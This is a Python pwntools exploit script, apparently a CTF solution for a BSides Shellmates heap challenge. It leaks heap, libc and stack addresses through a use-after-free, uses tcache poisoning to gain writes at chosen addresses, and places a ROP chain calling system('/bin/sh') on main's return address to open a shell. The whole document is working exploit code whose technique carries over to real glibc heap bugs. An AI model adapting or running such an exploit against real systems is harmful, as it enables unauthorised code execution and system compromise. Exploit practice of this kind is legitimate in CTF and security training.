#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)


host, port = "just-pwnme.bsides.shellmates.club", "443"

if args.REMOTE:
  p = remote(host,port,ssl=True)	# server requires ssl
else:
  p = process([exe.path])

# helpers
def alloc(idx,size,data=''):
  sla('choice : ', '0')
  sla('Index : ', str(idx))
  sla('Size : ', str(size))
  if (size):
    sa('Data : ', data)

def free(idx):
  sla('choice : ', '1')
  sla('Index : ', str(idx))

def show(idx):
  sla('choice : ', '2')
  sla('Index : ', str(idx))

def edit(idx,data):
  sla('choice : ', '3')
  sla('Index : ', str(idx))
  sla('Data : ', data)

# first free a heap chunk to leak heap base
alloc(0,0x100,'a')
alloc(1,0x100,'b')
free(0)
show(0)
heap = u64(p.recvuntil('\n',drop=True).ljust(8,b'\x00'))<<12
logleak('heap', heap)

# fill tcache
alloc(0,0x100,'a')
for i in range(7):
  edit(1,p64((heap+0x3b0)^ (heap>>12)) + p64(1))
  free(1)

#Â make chunk goes in unsorted, and leak libc base
free(0)
show(0)
libc.address = u64(p.recvuntil('\n',drop=True).ljust(8,b'\x00'))-0x219ce0
logbase()
rop = ROP(libc)

# get allocation on libc environ and leak stack environments vars address
alloc(0,0x100,p64((libc.sym['environ']-0x10) ^ (heap>>12)))
alloc(0,0x100,'a')
alloc(0,0x100,'a'*0x10)
show(0)
stack = u64(rcu(b'a'*0x10, b'\n').ljust(8,b'\x00'))
logleak('stack', stack)

# prepare ROP payload that will be written on stack
rop.raw(rop.find_gadget(['ret'])[0])	# one ret for stack alignement
rop.call(libc.symbols[b'system'],[next(libc.search(b'/bin/sh'))])
payload = p64(0)+rop.chain()

# get allocation on stack, and write ROP directly on main() return address
for i in range(2):
  edit(1,p64((heap+0x3b0)^ (heap>>12)) + p64(1))
  free(1)
alloc(0,0x100,p64((stack-0x128) ^ (heap>>12)))
alloc(0,0x100,'a')
alloc(0,0x100, payload)

# exit, and so execute our ROP
sla('choice : ', '4')

p.interactive()

